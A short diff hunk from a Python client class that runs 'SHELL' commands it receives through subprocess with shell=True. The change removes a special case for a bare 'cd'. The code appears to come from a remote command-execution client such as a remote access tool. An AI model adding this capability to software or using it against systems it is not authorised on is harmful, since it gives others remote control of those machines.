@@ -497,10 +497,6 @@ class Client(object):
                 continue
 
             if data[0] == 'SHELL':
-                if data[1] == 'cd':
-                    self.send(os.getcwdb())
-                    continue
-
                 split_command = data[1].split(' ')[0].strip().lower()
                 if split_command == 'cd' or split_command == 'chdir':
                     process = subprocess.Popen(data[1] + self._pwd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
